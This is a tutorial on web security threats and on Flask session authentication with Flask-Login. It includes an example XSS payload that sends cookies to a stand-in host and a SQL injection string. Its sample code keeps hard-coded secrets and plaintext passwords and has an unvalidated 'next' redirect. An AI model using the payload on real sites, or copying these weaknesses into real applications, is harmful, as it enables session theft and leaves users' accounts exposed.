# Web Authentication, Sessions & Security Principles

## 1. Core Web Security Threats & Mitigations

Building secure web applications requires protecting every part of your system. Below are the five most critical web security vulnerabilities and how to address them.

---

### A. SQL Injection (SQLi)
*   **The Concept**: A malicious user tricks your database into executing arbitrary commands by inserting SQL syntax into input fields.
*   **Vulnerable Implementation**:
    ```python
    # ❌ DANGEROUS: Direct string concatenation
    username = request.form['username']
    query = f"SELECT * FROM users WHERE name = '{username}'"
    db.execute(query)
    ```
    If a hacker inputs `' OR 1=1; --`, the resulting query evaluates to:
    `SELECT * FROM users WHERE name = '' OR 1=1; --'`
    Since `1=1` is always true, the entire table is returned, bypassing authentication completely.

*   **The Mitigation (Parameterized Queries)**:
    ```python
    # ✅ SAFE: Bound variables
    db.execute("SELECT * FROM users WHERE name = ?", (username,))
    ```
    The query engine treats the input strictly as a literal text value, rendering any SQL characters harmless.

---

### B. Cross-Site Scripting (XSS)
*   **The Concept**: An attacker injects malicious client-side scripts (usually JavaScript) into dynamic content that is later viewed by other users.
*   **Vulnerable Implementation**:
    A hacker submits a forum post containing a script:
    ```html
    <script>fetch('http://hacker.com/steal?cookie=' + document.cookie)</script>
    ```
    When other users view this post, their browsers execute the script, transmitting their active login cookies directly to the hacker.

*   **The Mitigation (Escaping & Sanitization)**:
    Jinja2 automatically escapes characters on render (converting `<` to `&lt;`). Always use safe escaping methods and avoid the raw `|safe` filter unless you are absolutely certain of the input origin.

---

### C. Cross-Site Request Forgery (CSRF)
*   **The Concept**: An attacker tricks an authenticated user's browser into making an unauthorized request to a trusted application where they are already logged in (e.g. initiating an bank transfer or changing an email).
*   **The Mitigation (CSRF Tokens)**:
    Servers generate unique, cryptographically signed tokens for each user session. Forms must submit this token with POST requests, which the server validates. Since outside sites cannot access the token (due to the **Same-Origin Policy**), forged requests fail.

---

### D. Secure Communication (HTTPS)
*   **The Concept**: Plain HTTP transmits data (passwords, cookies) as clear text over the wire, leaving it vulnerable to network eavesdropping and tampering.
*   **The Mitigation (HTTPS)**:
    **HTTPS** (HTTP Secure) wraps traffic in an encrypted **TLS/SSL tunnel**.
    ```
      HTTP:  Client ─── "password: 123" ───> Eavesdropper (Reads plain text)
      HTTPS: Client ─── "x$9!fP&8" ───────> Eavesdropper (Gibberish) ───> Server (Decrypted)
    ```

---

### E. Password Storage & Cryptographic Hashing
*   **The Concept**: Passwords must **never** be stored as plain text. If a database is compromised, all user accounts are exposed.
*   **The Mitigation (One-Way Hashing & Salting)**:
    A cryptographic hash function is a one-way mathematical function.
    ```
    Plain Text Password ───> Hash Function (e.g., pbkdf2) ───> Secure Hash
    ```
    *   **One-Way Guarantee**: It is computationally impossible to reverse a secure hash back into the original password.
    *   **Salting**: A unique, random string (the "salt") is added to each password before hashing. This ensures identical passwords yield different hashes, preventing lookup/rainbow table attacks.

---

## 2. Session-Based Authentication

Because the HTTP protocol is **stateless**, the server forgets a client immediately after sending a response. To persist authentication, we use **Sessions** and **Cookies**.

```
  CLIENT BROWSER                                          FLASK SERVER
        │                                                      │
        │  1. POST /login {user:"admin", pwd:"123"}            │
        ├─────────────────────────────────────────────────────>│
        │                                                      │ 2. Credentials valid? YES
        │                                                      │ 3. session["user"] = "admin"
        │                                                      │ 4. Sign session cookie
        │                                                      │
        │  5. Response with Signed Cookie (Set-Cookie)         │
        |<─────────────────────────────────────────────────────┤
        │                                                      │
  (Saves cookie in browser)                                    │
        │                                                      │
        │  6. GET /dashboard (Includes signed cookie)          │
        ├─────────────────────────────────────────────────────>│
        │                                                      │ 7. Validate cryptographic signature
        │                                                      │ 8. Decode: user = "admin"
        │                                                      │ 9. Render dashboard
        │  10. Return Dashboard HTML                           │
        |<─────────────────────────────────────────────────────┤
```

### The Role of `app.secret_key`
Flask sessions are stored in client-side cookies. The cookie data is **Base64 encoded**, meaning anyone can read it. To prevent users from modifying their cookies (e.g. changing `user` to `admin`), Flask signs the cookie using `app.secret_key`.

If a user alters even a single character in the cookie, the cryptographic signature will not match when returned to the server, and Flask immediately rejects the session.

> [!WARNING]
> Never commit your production `secret_key` directly to source repositories. Always load it securely via environment variables:
> ```python
> import os
> app.secret_key = os.environ.get('SECRET_KEY')
> ```

---

## 3. Hands-On: Manual Session Implementation in Flask

This implementation shows how sessions work at a low level using Flask's built-in `session` dictionary.

```python
from flask import Flask, render_template, request, session, redirect, url_for
import os

app = Flask(__name__)
# Cryptographically sign the session cookie
app.secret_key = os.environ.get('SECRET_KEY', 'sac_mad_one_flask_login_week')

# Mock Database
USERS = {
    'admin': 'hashed_password_placeholder'
}

@app.route('/login', methods=['GET', 'POST'])
def sign_in():
    if request.method == 'GET':
        return render_template('login.html')

    username = request.form.get('username')
    password = request.form.get('password')

    # Basic verification (In production, use hashed passwords!)
    if username == 'admin' and password == '12345':
        # Serialize, sign, and write cookie
        session['user'] = username
        return redirect(url_for('dashboard'))

    return "Invalid credentials", 401

@app.route('/dashboard')
def dashboard():
    # MANUAL CHECK: Required on every single protected route
    if 'user' not in session:
        return redirect(url_for('sign_in'))

    return f"<h1>Welcome to the secure dashboard, {session['user']}!</h1>"

@app.route('/logout')
def sign_out():
    # Clear the session dictionary to remove the authentication state
    session.clear()
    return redirect(url_for('sign_in'))

if __name__ == '__main__':
    app.run(debug=True)
```

---

## 4. Professional Session Management: Flask-Login

While manual session checks are educational, writing `if 'user' not in session:` on every route is error-prone. If you miss a single route check, you create an authorization vulnerability.

The **Flask-Login** extension automates this process using decorators and injects a robust active user object (`current_user`) globally.

```
                  FLASK-LOGIN ARCHITECTURE
                  
  ┌────────────────────────────────────────────────────────┐
  │ 1. LoginManager                                        │
  │    Central controller. Handles redirects & session verification. │
  └───────────────────────────┬────────────────────────────┘
                              │
  ┌───────────────────────────▼────────────────────────────┐
  │ 2. User Class (UserMixin)                              │
  │    Model wrapper returning is_authenticated, is_active.  │
  └───────────────────────────┬────────────────────────────┘
                              │
  ┌───────────────────────────▼────────────────────────────┐
  │ 3. User Loader (@user_loader)                          │
  │    Called on every request to fetch User from DB by ID.│
  └───────────────────────────┬────────────────────────────┘
                              │
  ┌───────────────────────────▼────────────────────────────┐
  │ 4. Route Decorators (@login_required)                  │
  │    Route-level protection & current_user object proxy. │
  └────────────────────────────────────────────────────────┘
```

### Complete Implementation Example

```python
from flask import Flask, render_template, request, redirect, url_for
from flask_login import (
    LoginManager, 
    UserMixin, 
    login_user, 
    login_required, 
    logout_user, 
    current_user
)

app = Flask(__name__)
app.secret_key = 'sac_mad_one_flask_login_week'

# Step 1: Initialize LoginManager
login_manager = LoginManager()
login_manager.init_app(app)

# Redirect unauthenticated users automatically to this endpoint
login_manager.login_view = 'sign_in'

# Step 2: Declare User Class inheriting from UserMixin
class User(UserMixin):
    def __init__(self, id, name):
        self.id = id
        self.name = name

# Mock Database
USERS_DB = {
    'admin': User(id='admin', name='Administrator')
}

# Step 3: Implement User Loader
@login_manager.user_loader
def load_user(user_id):
    # Converts session ID string back to a full User object on each request
    return USERS_DB.get(user_id)

@app.route('/login', methods=['GET', 'POST'])
def sign_in():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('pwd')

        user = USERS_DB.get(username)
        if user and password == '123': # Simple plain credential check
            # Sets session cookie containing user.id and hydrates current_user
            login_user(user)
            
            # Smart redirect: returns user to their originally requested URL
            next_page = request.args.get('next')
            return redirect(next_page or url_for('dashboard'))

        return "Invalid credentials", 401

    return render_template('login.html')

@app.route('/dashboard')
@login_required # Automatically secures endpoint; redirects to login_view if not logged in
def dashboard():
    # current_user is fully populated and accessible in routes and Jinja templates
    return f"<h1>Protected Area. Welcome, {current_user.name}!</h1>"

@app.route('/logout')
@login_required
def sign_out():
    logout_user()
    return redirect(url_for('sign_in'))

if __name__ == '__main__':
    app.run(debug=True)
```

---

## 5. Security Architecture Summary

| Feature | Manual Session Keys | Flask-Login Extension |
| :--- | :--- | :--- |
| **Route Protection** | Manual `if 'user' not in session:` | Declarative `@login_required` decorator |
| **Developer Error Risk** | High (easy to forget an authorization check) | Extremely Low |
| **Template Support** | Manual variable passing | Globally injected `current_user` template variable |
| **"Remember Me" Cookies**| Requires manual implementation | Native option: `login_user(user, remember=True)` |

---

## Glossary

| Term | Meaning |
| :--- | :--- |
| **Authentication** | The process of verifying a client's identity ("Who are you?"). |
| **Authorization** | The process of verifying permissions and access rights ("What are you allowed to do?"). |
| **Statelessness** | Protocol property where the server treats each request independently without retaining history. |
| **Cryptographic Salt**| A random string prepended to a password before hashing to protect against pre-computed table attacks. |
| **Cookie** | A small key-value pair stored by the browser, sent automatically with every request. |
| **CSRF Token** | A unique, unpredictable server-generated value used to validate form submissions. |
| **User Loader** | Callback function used by Flask-Login to lookup a user object from their stored ID. |
